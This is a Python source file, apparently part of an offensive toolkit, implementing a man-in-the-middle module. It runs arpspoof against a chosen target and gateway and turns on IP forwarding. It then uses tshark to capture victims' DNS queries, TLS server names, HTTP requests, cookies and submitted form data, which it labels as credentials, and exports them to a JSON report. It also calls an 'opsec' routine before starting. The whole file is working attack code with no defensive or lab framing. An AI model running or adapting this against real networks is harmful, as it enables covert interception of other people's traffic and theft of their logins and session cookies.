"""MITM module — ARP spoofing, traffic capture, DNS/SNI extraction."""

from __future__ import annotations

import json
import os
import subprocess
import threading
import time
from dataclasses import dataclass, field

from rich.console import Console
from rich.live import Live
from rich.table import Table

from ..core.config import Config
from ..core.opsec import OpsecEngine

console = Console()


@dataclass
class CapturedTraffic:
    dns_queries: list[dict] = field(default_factory=list)
    sni_domains: list[dict] = field(default_factory=list)
    http_requests: list[dict] = field(default_factory=list)
    credentials: list[dict] = field(default_factory=list)


class MitmModule:
    def __init__(self, config: Config, opsec: OpsecEngine) -> None:
        self.config = config
        self.opsec = opsec
        self.traffic = CapturedTraffic()
        self._running = False
        self._threads: list[threading.Thread] = []

    def start(
        self, interface: str, target_ip: str, gateway_ip: str,
    ) -> None:
        self.opsec.pre_operation()
        self._running = True

        self._enable_ip_forwarding()
        self._start_arp_spoof(interface, target_ip, gateway_ip)

        capture_types = self.config.mitm_capture
        if "dns" in capture_types:
            t = threading.Thread(
                target=self._capture_dns, args=(interface,), daemon=True,
            )
            t.start()
            self._threads.append(t)

        if "sni" in capture_types:
            t = threading.Thread(
                target=self._capture_sni, args=(interface,), daemon=True,
            )
            t.start()
            self._threads.append(t)

        if "http_credentials" in capture_types:
            t = threading.Thread(
                target=self._capture_http, args=(interface,), daemon=True,
            )
            t.start()
            self._threads.append(t)

        console.print("[green]MITM active — capturing traffic[/green]")

    def stop(self) -> CapturedTraffic:
        self._running = False

        for proc_name in ("_arp_proc1", "_arp_proc2"):
            proc = getattr(self, proc_name, None)
            if proc:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except Exception:
                    proc.kill()

        self._disable_ip_forwarding()
        console.print("[yellow]MITM stopped[/yellow]")
        return self.traffic

    def _enable_ip_forwarding(self) -> None:
        subprocess.run(
            ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
            capture_output=True,
        )
        console.print("[dim]IP forwarding enabled[/dim]")

    def _disable_ip_forwarding(self) -> None:
        subprocess.run(
            ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],
            capture_output=True,
        )
        console.print("[dim]IP forwarding disabled[/dim]")

    def _start_arp_spoof(
        self, interface: str, target_ip: str, gateway_ip: str,
    ) -> None:
        console.print(
            f"[cyan]ARP spoofing: {target_ip} ↔ {gateway_ip} "
            f"(fullduplex={self.config.mitm_fullduplex})[/cyan]"
        )

        cmd = [
            "sudo", "arpspoof",
            "-i", interface,
            "-t", target_ip,
            gateway_ip,
        ]
        self._arp_proc1 = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )

        if self.config.mitm_fullduplex:
            cmd_reverse = [
                "sudo", "arpspoof",
                "-i", interface,
                "-t", gateway_ip,
                target_ip,
            ]
            self._arp_proc2 = subprocess.Popen(
                cmd_reverse, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )

    def _capture_dns(self, interface: str) -> None:
        proc = subprocess.Popen(
            ["sudo", "tshark",
             "-i", interface,
             "-f", "udp port 53",
             "-T", "fields",
             "-e", "ip.src",
             "-e", "dns.qry.name",
             "-e", "dns.qry.type",
             "-Y", "dns.flags.response == 0",
             "-l"],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
        )

        while self._running and proc.poll() is None:
            line = proc.stdout.readline().strip()
            if not line:
                continue
            parts = line.split("\t")
            if len(parts) >= 2:
                entry = {
                    "timestamp": time.strftime("%H:%M:%S"),
                    "source": parts[0],
                    "domain": parts[1],
                    "type": parts[2] if len(parts) > 2 else "A",
                }
                self.traffic.dns_queries.append(entry)
                console.print(
                    f"[dim]DNS: {entry['source']} → {entry['domain']}[/dim]"
                )

        proc.terminate()

    def _capture_sni(self, interface: str) -> None:
        proc = subprocess.Popen(
            ["sudo", "tshark",
             "-i", interface,
             "-f", "tcp port 443",
             "-Y", "tls.handshake.extensions_server_name",
             "-T", "fields",
             "-e", "ip.src",
             "-e", "tls.handshake.extensions_server_name",
             "-l"],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
        )

        while self._running and proc.poll() is None:
            line = proc.stdout.readline().strip()
            if not line:
                continue
            parts = line.split("\t")
            if len(parts) >= 2:
                entry = {
                    "timestamp": time.strftime("%H:%M:%S"),
                    "source": parts[0],
                    "domain": parts[1],
                }
                self.traffic.sni_domains.append(entry)
                console.print(
                    f"[blue]SNI: {entry['source']} → {entry['domain']}[/blue]"
                )

        proc.terminate()

    def _capture_http(self, interface: str) -> None:
        proc = subprocess.Popen(
            ["sudo", "tshark",
             "-i", interface,
             "-f", "tcp port 80",
             "-Y", "http.request",
             "-T", "fields",
             "-e", "ip.src",
             "-e", "http.host",
             "-e", "http.request.uri",
             "-e", "http.request.method",
             "-e", "http.cookie",
             "-e", "urlencoded-form.value",
             "-l"],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
        )

        while self._running and proc.poll() is None:
            line = proc.stdout.readline().strip()
            if not line:
                continue
            parts = line.split("\t")
            if len(parts) >= 4:
                entry = {
                    "timestamp": time.strftime("%H:%M:%S"),
                    "source": parts[0],
                    "host": parts[1],
                    "uri": parts[2],
                    "method": parts[3],
                }
                self.traffic.http_requests.append(entry)
                console.print(
                    f"[yellow]HTTP: {entry['method']} "
                    f"{entry['host']}{entry['uri']}[/yellow]"
                )

                if len(parts) > 5 and parts[5]:
                    cred = {**entry, "form_data": parts[5]}
                    self.traffic.credentials.append(cred)
                    console.print(
                        f"[red bold]CRED: {entry['host']} — form data captured[/red bold]"
                    )

        proc.terminate()

    def live_dashboard(self) -> None:
        def build_table() -> Table:
            table = Table(title="Live Traffic Dashboard")
            table.add_column("Time", style="dim", width=10)
            table.add_column("Type", width=6)
            table.add_column("Source", style="cyan", width=16)
            table.add_column("Destination / Domain", style="green")

            all_entries = []
            for d in self.traffic.dns_queries[-20:]:
                all_entries.append((d["timestamp"], "DNS", d["source"], d["domain"]))
            for s in self.traffic.sni_domains[-20:]:
                all_entries.append((s["timestamp"], "SNI", s["source"], s["domain"]))
            for h in self.traffic.http_requests[-20:]:
                all_entries.append((
                    h["timestamp"], "HTTP", h["source"],
                    f"{h['method']} {h['host']}{h['uri']}",
                ))

            all_entries.sort(key=lambda x: x[0], reverse=True)
            for ts, typ, src, dst in all_entries[:30]:
                table.add_row(ts, typ, src, dst)

            return table

        with Live(build_table(), refresh_per_second=1, console=console) as live:
            while self._running:
                time.sleep(1)
                live.update(build_table())

    def export(self, output_dir: str = "./reports") -> str:
        os.makedirs(output_dir, exist_ok=True)
        ts = time.strftime("%Y%m%d_%H%M%S")
        path = os.path.join(output_dir, f"mitm_capture_{ts}.json")

        data = {
            "dns_queries": self.traffic.dns_queries,
            "sni_domains": self.traffic.sni_domains,
            "http_requests": self.traffic.http_requests,
            "credentials": self.traffic.credentials,
            "stats": {
                "total_dns": len(self.traffic.dns_queries),
                "total_sni": len(self.traffic.sni_domains),
                "total_http": len(self.traffic.http_requests),
                "total_credentials": len(self.traffic.credentials),
                "unique_domains": len(set(
                    d["domain"] for d in
                    self.traffic.dns_queries + self.traffic.sni_domains
                )),
            },
        }

        with open(path, "w") as f:
            json.dump(data, f, indent=2)

        console.print(f"[green]Traffic exported to {path}[/green]")
        return path
